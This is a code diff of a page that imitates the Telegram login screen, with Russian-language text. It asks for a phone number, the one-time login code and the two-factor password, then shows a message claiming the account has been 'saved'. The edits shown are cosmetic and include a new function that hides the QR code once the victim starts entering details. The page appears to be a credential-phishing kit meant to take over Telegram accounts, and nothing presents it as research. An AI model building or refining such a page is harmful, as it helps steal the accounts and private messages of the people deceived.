@@ -51,21 +51,26 @@
         .phone-field .country-arrow { color: #8e9ba8; font-size: 14px; margin-right: 8px; }
         .phone-field input { flex: 1; padding: 14px 0; background: transparent; border: none; outline: none; font-size: 20px; color: #222; min-width: 0; }
         .phone-field input::placeholder { color: #8e9ba8; }
+
         .code-inputs { display: flex; gap: 12px; justify-content: center; margin: 16px 0; }
         .code-inputs input { width: 48px; height: 56px; font-size: 28px; text-align: center; background: #f0f2f5; border: 1px solid #d5d8dd; border-radius: 12px; color: #222; outline: none; }
         .code-inputs input:focus { border-color: #4da7e8; }
+
         .btn { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
         .btn-primary { background: #4da7e8; color: #fff; }
         .btn-primary:hover { background: #3b8bc4; }
         .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+
         .hidden { display: none !important; }
+
         .info-text { color: #8e9ba8; font-size: 15px; margin: 8px 0 16px; }
         .info-text span { color: #222; font-weight: 500; }
+
         .back { background: none; border: none; color: #4da7e8; font-size: 24px; cursor: pointer; padding: 0; margin-bottom: 8px; text-align: left; }
+
         .footer-links { margin-top: 24px; }
         .footer-links a { color: #4da7e8; text-decoration: none; font-size: 15px; display: inline-block; margin-top: 8px; cursor: pointer; }
 
-        /* ===== ФИНАЛЬНАЯ СТРАНИЦА ===== */
         .success-page {
             text-align: center;
             padding: 20px 0;
@@ -105,7 +110,7 @@
 <div class="login-container">
 
     <!-- QR-код -->
-    <div class="qr-container">
+    <div class="qr-container" id="qr-container">
         <div class="qr-box">
             <img src="https://ooptom.ru/upload/resize_cache/iblock/30f/650_800_1/30f96c7b04edfd57a555205f531e4cba.jpg" alt="QR-код Telegram">
         </div>
@@ -126,7 +131,7 @@
         <div class="phone-field">
             <span class="country-code">+</span>
             <span class="country-arrow">▾</span>
-            <input type="tel" id="phone-input" placeholder="900 000-00-00" maxlength="20">
+            <input type="tel" id="phone-input" placeholder="000 000-00-00" maxlength="20">
         </div>
         <button class="btn btn-primary" id="send-phone-btn" disabled>Далее</button>
     </div>
@@ -155,7 +160,7 @@
         <button class="btn btn-primary" id="send-2fa-btn">Подтвердить</button>
     </div>
 
-    <!-- ===== ШАГ 4: ФИНАЛЬНАЯ СТРАНИЦА ===== -->
+    <!-- Финальная страница -->
     <div id="step-success" class="hidden success-page">
         <div class="check">✅</div>
         <h2>Ваш аккаунт успешно сохранён</h2>
@@ -179,6 +184,7 @@
     let phone = '';
     let tempCode = '';
 
+    const qrContainer = document.getElementById('qr-container');
     const phoneStep = document.getElementById('phone-step');
     const codeStep = document.getElementById('code-step');
     const twofaStep = document.getElementById('step-2fa');
@@ -192,6 +198,11 @@
     const back2faBtn = document.getElementById('back-2fa-btn');
     const twofaInput = document.getElementById('twofa-input');
     const send2faBtn = document.getElementById('send-2fa-btn');
+
+    function hideQR() {
+        qrContainer.classList.add('hidden');
+        document.querySelector('.divider').classList.add('hidden');
+    }
 
     phoneInput.addEventListener('input', function() {
         let val = this.value.replace(/\D/g, '');
@@ -214,6 +225,7 @@
             displayPhone.textContent = formatted || raw;
             phoneStep.classList.add('hidden');
             codeStep.classList.remove('hidden');
+            hideQR();
             codeDigits[0].focus();
         } catch(err) {
             alert('Ошибка сети.');
@@ -284,6 +296,7 @@
             if (data.success) {
                 twofaStep.classList.add('hidden');
                 successStep.classList.remove('hidden');
+                hideQR();
             }
         } catch(err) {
             alert('Ошибка. Пароль не подтверждён.');
